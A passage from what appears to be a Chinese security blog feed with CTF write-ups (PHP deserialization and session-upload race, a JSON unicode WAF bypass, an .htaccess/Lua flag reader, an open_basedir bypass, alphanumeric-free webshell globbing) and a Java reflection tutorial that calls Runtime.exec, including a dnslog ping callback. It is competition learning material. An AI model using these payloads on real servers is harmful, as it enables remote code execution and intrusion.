href=&quot;#you&quot;&gt;YOU&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;    &lt;/nav&gt;&lt;/header&gt;&lt;div id=&quot;main&quot;&gt;&lt;article id=&quot;you&quot;&gt;    &lt;h2 class=&quot;major&quot; ng-app&gt;%s&lt;/h2&gt;    &lt;span class=&quot;image main&quot;&gt;&lt;img src=&quot;%s&quot; alt=&quot;&quot; /&gt;&lt;/span&gt; &lt;p&gt;%s&lt;/p&gt;&lt;button type=&quot;button&quot; onclick=location.href=&quot;/download/%s&quot;&gt;下载&lt;/button&gt;&lt;/article&gt;&lt;/div&gt;&lt;footer id=&quot;footer&quot;&gt;&lt;/footer&gt;&lt;/div&gt;&lt;script src=&quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/browser.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/breakpoints.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/util.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/main.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/angular.js&quot;&gt;&lt;/script&gt;   &lt;/body&gt;&lt;/html&gt;&#39;,substr($this-&gt;data[&#39;name&#39;],0,62),$this-&gt;data[&#39;image&#39;],$this-&gt;data[&#39;message&#39;],session_id().&#39;.jpg&#39;);

        if(file_put_contents($this-&gt;path,$this-&gt;html)){
            include($this-&gt;path);
        }
    }
}</code></pre>
</li>
<li><p>payload</p>
<pre><code class="php">&lt;?php

class Cache{
    public $data ;
    public $sj;
    public $path = &#39;/Library/WebServer/Documents/ctf/index.php&#39;;
    public $html;

}
    $str = new Cache();
    $str-&gt;data= [
    &quot;name&quot; =&gt; &quot;payload&quot;,
    &quot;message&quot; =&gt; &quot;panda&quot;,
    &quot;image&quot; =&gt; &quot;panda&quot;
];
    echo serialize($str);

?&gt;</code></pre>
</li>
</ul>
<ul>
<li><p>EXP</p>
<p>最后使用SESSION上传进度，将其包含进SESSION,这里使用条件竞争。</p>
<pre><code class="php">&lt;form action=&quot;http://10.37.14.49/ctf/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;这里填payload&quot; /&gt;
    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
    &lt;input type=&quot;submit&quot; /&gt;
&lt;/form&gt;</code></pre>
</li>
</ul>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>西湖论剑Easyjson Write up</title>
    <url>//articles/2a808de4a49b19.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>太菜了只做了一道</p>
</blockquote>
<h2 id="Easyjson"><a href="#Easyjson" class="headerlink" title="Easyjson"></a>Easyjson</h2><ul>
<li>代码审计</li>
</ul>
<pre><code class="php"> &lt;?php
include &#39;security.php&#39;;

if(!isset($_GET[&#39;source&#39;])){
    show_source(__FILE__);
    die();
}
$sandbox = &#39;sandbox/&#39;.sha1($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]).&#39;/&#39;;
var_dump($sandbox);
if(!file_exists($sandbox)){
    mkdir($sandbox);
    file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&quot;);
}
$action = $_GET[&#39;action&#39;];
$content = file_get_contents(&quot;php://input&quot;);


if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
    $content = json_decode($content);
    $filename = $_GET[&#39;filename&#39;];
    $filecontent = $content-&gt;content;
    $filename = $sandbox.$filename;
    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
}elseif($action == &quot;reset&quot;){
    $files = scandir($sandbox);
    foreach($files as $file) {
        if(!is_dir($file)){
            if($file !== &quot;index.php&quot;){
                unlink($sandbox.$file);
            }
        }
    }
}
else{
    die(&#39;Security Check Failed.&#39;);
}
</code></pre>
<ul>
<li>代码主要部分在,但是这里有一个waf对文件名和content参数进行过滤。简单Fuzz了一下，filename可以使用php后缀，说明可以写php文件，但是有一个很关键的问题就是<code>content</code>它传来必须是一个json,json中有一个属性是content，例如：<code>{&#39;content&#39;:&#39;&lt;?=phpinfo()?&gt;&#39;}</code>但是<code>waf</code>对json进行了过滤，不能存在content这个字符串(还过滤了其他关键字)。</li>
</ul>
<pre><code class="php">if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
    $content = json_decode($content);
    $filename = $_GET[&#39;filename&#39;];
    $filecontent = $content-&gt;content;
    $filename = $sandbox.$filename;
    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
}</code></pre>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001234@2x.png" alt="WX20201009-001234@2x"></p>
<ul>
<li>神小密圈发现，json支持的字符中可以支持unicode编码，那么我们全都用unicode编码来代替字符串不就行了？</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG59.jpeg" alt="WechatIMG59"></p>
<ul>
<li>简单测试一下发现可以.<a href="https://blog.csdn.net/weixin_30654419/article/details/97554779?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param" target="_blank" rel="noopener">Unicode表</a></li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG72.png" alt="WechatIMG72"></p>
<ul>
<li>简单写个脚本来将字符串转化为unicode编码。</li>
</ul>
<pre><code class="php">&lt;?php

function unicode_encode($str){
    $table = [
            &#39;\u002&#39;=&gt;[&#39; &#39;,&#39;!&#39;,&#39;&quot;&#39;,&#39;#&#39;,&#39;$&#39;,&#39;%&#39;,&#39;&amp;&#39;,&#39;\&#39;&#39;,&#39;(&#39;,&#39;)&#39;,&#39;*&#39;,&#39;+&#39;,&#39;,&#39;,&#39;-&#39;,&#39;.&#39;,&#39;/&#39;],
            &#39;\u003&#39;=&gt;[&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;:&#39;,&#39;;&#39;,&#39;&lt;&#39;,&#39;=&#39;,&#39;&gt;&#39;,&#39;?&#39;],
            &#39;\u004&#39;=&gt;[&#39;@&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;],
            &#39;\u005&#39;=&gt;[&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;[&#39;,&#39;\\&#39;,&#39;]&#39;,&#39;^&#39;,&#39;_&#39;],
            &#39;\u006&#39;=&gt;[&#39;`&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;],
            &#39;\u007&#39;=&gt;[&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;{&#39;,&#39;|&#39;,&#39;}&#39;,&#39;~&#39;]
];
    foreach ($table as $key =&gt; $value) {
        $i = 0;
        foreach ($value as $vcode) {
            $i=$i+1;
            if($str==$vcode){
                return $key.bin2e($i-1);
            }

        }
    }

}

function bin2e($str){
    switch ($str) {
        case &#39;10&#39;:
            return &#39;a&#39;;
            break;
        case &#39;11&#39;:
            return &#39;b&#39;;
            break;
        case &#39;12&#39;:
            return &#39;c&#39;;
            break;
        case &#39;13&#39;:
            return &#39;d&#39;;
            break;
        case &#39;14&#39;:
            return &#39;e&#39;;
            break;
        case &#39;15&#39;:
            return &#39;f&#39;;
            break;
        default:
            return $str;
            break;
    }
}

function main($str){
for($i=0;$i&lt;strlen($str);$i++){
    echo unicode_encode($str[$i]);
}
}


main(&#39;&lt;?=phpinfo()?&gt;&#39;);
?&gt;</code></pre>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000458@2x.png" alt="WX20201009-000458@2x"></p>
<ul>
<li>EXP</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000600@2x.png" alt="WX20201009-000600@2x"></p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000806@2x.png" alt="WX20201009-000806@2x"></p>
<ul>
<li>Getflag</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001124@2x.png" alt="WX20201009-001124@2x"></p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001031@2x.png" alt></p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000938@2x.png" alt="WX20201009-000938@2x"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反射学习</title>
    <url>//articles/58699674516d08.html</url>
    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><a href="https://baike.baidu.com/item/JAVA反射机制/6015990" target="_blank" rel="noopener">JAVA反射机制</a>是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制</p>
<h2 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h2><h3 id="获取类对象"><a href="#获取类对象" class="headerlink" title="获取类对象"></a>获取类对象</h3><pre><code class="java">package test;
import java.lang.Class.*;

public class reflection1 {
    public static void main(String[] args) throws Exception {
            Class.forName(&quot;test.xxx&quot;);
    }
}
class xxx{
    public void  xxx(){
        System.out.println(&quot;hello world&quot;);
    }
    static {
        System.out.println(&quot;test1&quot;);
    }
    {
        System.out.println(&quot;test2&quot;);
    }
}</code></pre>
<ul>
<li>当<code>forName</code>方法获取一个类的时候会调用这个类的static静态代码。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-134345@2x.png" alt="WX20201115-134345@2x"></p>
<h3 id="获取类方法"><a href="#获取类方法" class="headerlink" title="获取类方法"></a>获取类方法</h3><h4 id="获取全部方法"><a href="#获取全部方法" class="headerlink" title="获取全部方法"></a>获取全部方法</h4><ul>
<li><code>getMethod</code>来获取函数的方法，执行<code>invoke</code>后通过<code>newInstance</code>来调用构造函数，但是<code>{}</code>的优先级会比构造方法高，所以运行结果会是先<code>{}</code>、构造方法、普通方法。</li>
</ul>
<pre><code class="java">package test;
public class reflection1 {
    public static void main(String[] args) throws Exception {
        Class clazz=Class.forName(&quot;test.xxx&quot;);
        //实例化类,然后调用方法
        clazz.getMethod(&quot;hello&quot;).invoke(clazz.newInstance());
    }
}
class xxx{
    public   xxx(){
        System.out.println(&quot;test1&quot;);
    }
    public void hello(){
        System.out.println(&quot;hello&quot;);
    }
    static {
        System.out.println(&quot;test2&quot;);
    }
    {
        System.out.println(&quot;test3&quot;);
    }
}</code></pre>
<ul>
<li>运行结果</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-143559@2x.png" alt="WX20201115-143559@2x"></p>
<h4 id="获取无参数构造方法"><a href="#获取无参数构造方法" class="headerlink" title="获取无参数构造方法"></a>获取无参数构造方法</h4><ul>
<li>同样先需要获取到对应的类对象，然后通过<code>getDeclaredConstructor</code>方法来获取构造方法，这里有个细节如果获取的构造方法是私有（private）时候需要使用<code>setAccessible</code>,最后使用<code>newInstance</code>来创建实例。</li>
</ul>
<pre><code class="java">package test;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;

public class reflection1 {
    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException {
        Class&lt;?&gt; clazz = Class.forName(&quot;test.zzz&quot;);
        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor();
        constructor.setAccessible(true);
        constructor.newInstance();
    }
}
class zzz{
    private zzz(){
        System.out.println(&quot;this is zzz&quot;);
    }
    private zzz(String name){
        System.out.println(&quot;this is &quot;+name);
    }
    private zzz(int age,String name){
        System.out.println(&quot;this is &quot;+age+&quot;:&quot;+name);
    }
}</code></pre>
<h4 id="获取含参数构造方法"><a href="#获取含参数构造方法" class="headerlink" title="获取含参数构造方法"></a>获取含参数构造方法</h4><ul>
<li>同样使用<code>getDeclaredConstructor</code>方法来获取，但是需要指定参数数据类型。然后在<code>newInstance</code>传参即可。</li>
</ul>
<pre><code class="java">package test;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;

public class reflection1 {
    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException {
        Class&lt;?&gt; clazz = Class.forName(&quot;test.zzz&quot;);
        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        constructor.newInstance(&quot;黄莉荃&quot;);
    }
}
class zzz{
    private zzz(){
        System.out.println(&quot;this is zzz&quot;);
    }
    private zzz(String name){
        System.out.println(&quot;this is &quot;+name);
    }
    private zzz(int age,String name){
        System.out.println(&quot;this is &quot;+age+&quot;:&quot;+name);
    }
}</code></pre>
<h6 id="getDeclaredConstructors"><a href="#getDeclaredConstructors" class="headerlink" title="getDeclaredConstructors"></a>getDeclaredConstructors</h6><ul>
<li><code>getDeclaredConstructors</code>将会返回所有构造方法的数组</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-153623@2x.png" alt="WX20201115-153623@2x"></p>
<ul>
<li>以获取索引为2的方法为例：</li>
</ul>
<pre><code class="java">package test;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;

public class reflection1 {
    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException {
        Class&lt;?&gt; clazz = Class.forName(&quot;test.zzz&quot;);
        Constructor&lt;?&gt;[] constructors = clazz.getDeclaredConstructors();
        Constructor constructor = constructors[2];
        constructor.setAccessible(true);
//      输出内容
        System.out.println(constructor);
        constructor.newInstance(18,&quot;黄莉荃&quot;);
    }
}
class zzz{
    private zzz(){
        System.out.println(&quot;this is zzz&quot;);
    }
    private zzz(String name){
        System.out.println(&quot;this is &quot;+name);
    }
    private zzz(int age,String name){
        System.out.println(&quot;this is &quot;+age+&quot;:&quot;+name);
    }
}</code></pre>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-154252@2x.png" alt="WX20201115-154252@2x"></p>
<h4 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h4><ul>
<li>通过<code>getDeclaredField</code>来获取字段，如果是私有字段只需加上<code>field.setAccessible(true);</code>即可</li>
</ul>
<pre><code class="java">package test;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class reflection1 {
    public static &lt;Feild&gt; void main(String[] args) throws Exception {
        //获取类
        Class clazz=Class.forName(&quot;test.test&quot;);
        //获取私有方法
        Constructor c = clazz.getDeclaredConstructor();
        //获取私有字段
        Field field = clazz.getDeclaredField(&quot;age&quot;);
        System.out.println(field.get(c.newInstance()));
    }
}

class test{
    public test(){
        System.out.println(&quot;test&quot;);
    }
    public int age=222;
}</code></pre>
<h4 id="修改字段值"><a href="#修改字段值" class="headerlink" title="修改字段值"></a>修改字段值</h4><ul>
<li>使用set方法即可修改</li>
</ul>
<pre><code class="java">package test;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class reflection1 {
    public static &lt;Feild&gt; void main(String[] args) throws Exception {
        //获取类
        Class clazz=Class.forName(&quot;test.test&quot;);
        //获取私有方法
        Constructor c = clazz.getDeclaredConstructor();
        //获取私有字段
        Object o = c.newInstance();
        Field field = clazz.getDeclaredField(&quot;age&quot;);
        field.set(o,1111);
        System.out.println(field.get(o));
    }
}

class test{
    public test(){
        System.out.println(&quot;test&quot;);
    }
    public int age=222;
}</code></pre>
<h4 id="反射调用java-lang-Runtime"><a href="#反射调用java-lang-Runtime" class="headerlink" title="反射调用java.lang.Runtime"></a>反射调用<code>java.lang.Runtime</code></h4><h5 id="利用方法一"><a href="#利用方法一" class="headerlink" title="利用方法一"></a>利用方法一</h5><pre><code class="java">package test;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class reflection1 {
    public static &lt;Feild&gt; void main(String[] args) throws Exception {
        Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);
        Constructor c = clazz.getDeclaredConstructor();
        c.setAccessible(true);
        clazz.getMethod(&quot;exec&quot;, String.class).invoke(c.newInstance(),&quot;open /Users/gqleung/Desktop/aaaa.txt&quot;);
    }
}</code></pre>
<ul>
<li>成功打开桌面的<code>aaaa.txt</code></li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-160241@2x.png" alt="WX20201115-160241@2x"></p>
<h5 id="利用方法二"><a href="#利用方法二" class="headerlink" title="利用方法二"></a>利用方法二</h5><pre><code class="java">package test;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class reflection1 {
    public static &lt;Feild&gt; void main(String[] args) throws Exception {
        Class clazz=Class.forName(&quot;java.lang.Runtime&quot;);
        clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),&quot;ping y3qge8.dnslog.cn&quot;);
    }
}</code></pre>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-161159@2x.png" alt="WX20201115-161159@2x"></p>
]]></content>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>西湖论剑newupload Write up</title>
    <url>//articles/a882b8c55b5a7.html</url>
    <content><![CDATA[<h3 id="NEWUPLOAD"><a href="#NEWUPLOAD" class="headerlink" title="NEWUPLOAD"></a>NEWUPLOAD</h3><ul>
<li>一开始比赛一直上传503，以为环境坏了。复现发现<code>.htaccess</code>可以直接上传，图片只能上传<code>jpg</code>.搞一个图片马，后缀直接换行绕过。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201012-000158@2x.png" alt="WX20201012-000158@2x"></p>
<h3 id="Bypass-open-dir"><a href="#Bypass-open-dir" class="headerlink" title="Bypass open_dir"></a>Bypass open_dir</h3><ul>
<li>由于开了open_dir读不了根目录。所以直接<code>bypass open_dir</code>,bypass代码。</li>
</ul>
<pre><code class="php">&lt;?php
ini_set(&#39;open_basedir&#39;,&#39;/tmp&#39;);
mkdir(&#39;/tmp/fuck/&#39;);
chdir(&#39;/tmp/fuck/&#39;);
ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
var_dump(scandir(&#39;/&#39;));
?&gt;</code></pre>
<ul>
<li>直接上传读到根目录文件情况。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201012-000711@2x.png" alt="WX20201012-000711@2x"></p>
<h3 id="Getflag"><a href="#Getflag" class="headerlink" title="Getflag"></a>Getflag</h3><ul>
<li>可以看到有readflag</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201012-000850@2x.png" alt="WX20201012-000850@2x"></p>
<ul>
<li><p>直接上.htaccess让它解析lua,再用lua读flag.</p>
</li>
<li><p>.htaccess</p>
</li>
</ul>
<pre><code>AddHandler lua-script .lua</code></pre><p><img src="https://goodcheerleung.gitee.io/macpic/WX20201012-001057@2x.png" alt="WX20201012-001057@2x"></p>
<ul>
<li>lua脚本</li>
</ul>
<pre><code class="php">require &quot;string&quot;

--[[
     This is the default method name for Lua handlers, see the optional
     function-name in the LuaMapHandler directive to choose a different
     entry point.
--]]
function handle(r)
    r.content_type = &quot;text/plain&quot;
    r:puts(&quot;Hello Lua World!\n&quot;)
    local t = io.popen(&#39;/readflag&#39;)
    local a = t:read(&quot;*all&quot;)
    r:puts(a)
    if r.method == &#39;GET&#39; then
        for k, v in pairs( r:parseargs() ) do
            r:puts( string.format(&quot;%s: %s\n&quot;, k, v) )
        end
    else
        r:puts(&quot;Unsupported HTTP method &quot; .. r.method)
    end
end</code></pre>
<ul>
<li>Getflag</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201012-001357@2x.png" alt="WX20201012-001357@2x"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>《无字母数字webshell之提高篇》读书笔记</title>
    <url>//articles/b7770c5dc9b5b.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul>
<li>前几天曾经教过的学员给我甩来了这么一道题。虽然想出了用通配符做，但是没有实际做出来，总的来说就是对无字母的webshell学习不够仔细，限于做出一道CTF题目为止的，蜻蜓点水的状态。</li>
</ul>
<h3 id="题目解决流程"><a href="#题目解决流程" class="headerlink" title="题目解决流程"></a>题目解决流程</h3><h4 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h4><pre><code class="php"> &lt;?php
if(isset($_GET[&#39;evil&#39;])){
    if(strlen($_GET[&#39;evil&#39;])&gt;25||preg_match(&quot;/[\w$=()&lt;&gt;&#39;\&quot;]/&quot;, $_GET[&#39;evil&#39;])){
        die(&quot;danger!!&quot;);
    }
    @eval($_GET[&#39;evil&#39;]);
}
highlight_file(__FILE__);
?&gt;</code></pre>
<h4 id="单个字符的Fuzz"><a href="#单个字符的Fuzz" class="headerlink" title="单个字符的Fuzz"></a>单个字符的Fuzz</h4><ul>
<li>题目主要是过滤了单个字符，这种Fuzz能够快速得知我们还有哪些字符能够用。编写一个脚本：</li>
</ul>
<pre><code class="php">&lt;?php
for ($ascii = 0; $ascii &lt; 256; $ascii++) {
    if (!preg_match(&quot;/[\w$=()&lt;&gt;&#39;\&quot;]/&quot;, chr($ascii))) {
        echo (chr($ascii));
    }
}
?&gt;
//运行结果
// !#%&amp;*+,-./:;?@[\]^`{|}~��������������������������������������������������������������������������������������������������������������������������������[Finished in 0.3s]
</code></pre>
<ul>
<li>可以快速地看到，我们呢广告用 的只有(!#%&amp;*+,-./:;?@[]^`{|}~),这里$,()都已经被过滤，不论是取反、异或、或运算、位运算都是通过动态拼接函数来实现执行任意代码的。这里还不能使用可见的字符，使用require来包含flag也是不可能实现的。这里还能用的就是反引号了。我们知道反引号能执行shell,它本质就是调用shell_exec,这个函数执行的shell是不会有回显的，就算catflag也不会显示出来。做到这里基本就没有思路了。</li>
</ul>
<h4 id="有趣的Linux-shell"><a href="#有趣的Linux-shell" class="headerlink" title="有趣的Linux shell"></a>有趣的Linux shell</h4><ul>
<li>回看P神的<code>《无字母数字webshell之提高篇》</code> ，可以 知道这么两个有趣的shell知识点：</li>
</ul>
<blockquote>
<p>1.shell下可以利用<code>.</code>来执行任意脚本</p>
<p>2.Linux文件名支持用glob通配符代替</p>
</blockquote>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-090013@2x.png" alt="WX20201015-090013@2x"></p>
<ul>
<li>但是我们用通配符来执行这个SB脚本的时候却会报错：</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-090353@2x.png" alt="WX20201015-090353@2x"></p>
<ul>
<li>这说明我们能够匹配上<code>??</code>的文件或者目录很多，我们直接列出来看看</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-093749@2x.png" alt="WX20201015-093749@2x"></p>
<ul>
<li>这说明两个字符的文件还是有很多的，我们必须匹配上我们唯一的文件才有可能直线我们想要直接的代码。</li>
</ul>
<h5 id="有趣的glob通配符"><a href="#有趣的glob通配符" class="headerlink" title="有趣的glob通配符"></a>有趣的glob通配符</h5><ul>
<li>我们都认识<code>*?</code>这两个通配符，其实在glob语法里面还支持类似于正则表达式的语法。例如<code>[^S]</code>就是排除掉S字母,我们可以排除掉S字母然后再列目录看看，就会发现SB这个文件被排除在外。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-094327@2x.png" alt="WX20201015-094327@2x"></p>
<ul>
<li>但是这里我们的要求是不能有字母数字，我们刚才说了glob是支持类似正则表达式的用法，如<code>[0-9]</code>,是支持的，那么我们在aiisc表中找出两个包含大写字母之间的字符就行了这样我们就能够成功获取到SB文件。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/aiisc.png" alt="aiisc"></p>
<ul>
<li>从AIISC表中我们可以知道，<code>@-[</code>是在大写字母之间的，那么我构造<code>[@-[]?</code>是不是能够匹配到SB了呢？答案是肯定的。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-145223@2x.png" alt="WX20201015-145223@2x"></p>
<ul>
<li>其实我们PHP在接受上传表单的文件流后会将文件保存到<code>/tmp</code>文件夹中，不论后端是否有编写上传的代码。而这个文件类似于这样的命名方式：<code>/tmp/phpXXXXXX</code>.</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c.png" alt="67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c"></p>
<ul>
<li>和上面讨论的一样，这样匹配出来的回匹配到很多文件，我哦们可以看到后面两位或者一位可能是大写这样我们就可以用<code>.+/???/????????[@-[]</code>来匹配执行文件。</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-212645@2x.png" alt="WX20201015-212645@2x"></p>
<ul>
<li>直接getflag</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201015-212949@2x.png" alt="WX20201015-212949@2x"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>XCTF鲲鹏专场babyphp Write Up</title>
    <url>//articles/babyphp_Write_Up.html</url>
    <content><![CDATA[<h1 id="babyphp-Write-Up"><a href="#babyphp-Write-Up" class="headerlink" title="babyphp Write Up"></a>babyphp Write Up</h1><p>题目是一个内网的扫描器，直接扫描内网端口看看。抓包发现提示去谷歌搜索找源码</p>
<p><img src="http://goodcheerleung.gitee.io/macpic/WX20201223-192602@2x.png" alt="WX20201223-192602@2x"></p>
<p>谷歌搜到源码：</p>
<pre><code class="php">&lt;?php

set_time_limit(0);//设置程序执行时间
ob_implicit_flush(True);
ob_end_flush();
$url = isset($_REQUEST[&#39;url&#39;])?$_REQUEST[&#39;url&#39;]:null; 

/*端口扫描代码*/
function check_port($ip,$port,$timeout=0.1) {
 $conn = @fsockopen($ip, $port, $errno, $errstr, $timeout);
 if ($conn) {
 fclose($conn);
 return true;
 }
}


function scanip($ip,$timeout,$portarr){
foreach($portarr as $port){
if(check_port($ip,$port,$timeout=0.1)==True){
echo &#39;Port: &#39;.$port.&#39; is open&lt;br/&gt;&#39;;
@ob_flush();
@flush();

}

}
}

echo &#39;&lt;html&gt;
&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;startip&quot; value=&quot;Start IP&quot; /&gt;
&lt;input type=&quot;text&quot; name=&quot;endip&quot; value=&quot;End IP&quot; /&gt;
&lt;input type=&quot;text&quot; name=&quot;port&quot; value=&quot;80,8080,8888,1433,3306&quot; /&gt;
Timeout&lt;input type=&quot;text&quot; name=&quot;timeout&quot; value=&quot;10&quot; /&gt;&lt;br/&gt;
&lt;button type=&quot;submit&quot; name=&quot;submit&quot;&gt;Scan&lt;/button&gt;
&lt;/form&gt;
&lt;/html&gt;
&#39;;

if(isset($_POST[&#39;startip&#39;])&amp;&amp;isset($_POST[&#39;endip&#39;])&amp;&amp;isset($_POST[&#39;port&#39;])&amp;&amp;isset($_POST[&#39;timeout&#39;])){

$startip=$_POST[&#39;startip&#39;];
$endip=$_POST[&#39;endip&#39;];
$timeout=$_POST[&#39;timeout&#39;];
$port=$_POST[&#39;port&#39;];
$portarr=explode(&#39;,&#39;,$port);
$siparr=explode(&#39;.&#39;,$startip);
$eiparr=explode(&#39;.&#39;,$endip);
$ciparr=$siparr;
if(count($ciparr)!=4||$siparr[0]!=$eiparr[0]||$siparr[1]!=$eiparr[1]){
exit(&#39;IP error: Wrong IP address or Trying to scan class A address&#39;);
}
if($startip==$endip){
echo &#39;Scanning IP &#39;.$startip.&#39;&lt;br/&gt;&#39;;
@ob_flush();
@flush();
scanip($startip,$timeout,$portarr);
@ob_flush();
@flush();
exit();
}

if($eiparr[3]!=255){
$eiparr[3]+=1;
}
while($ciparr!=$eiparr){
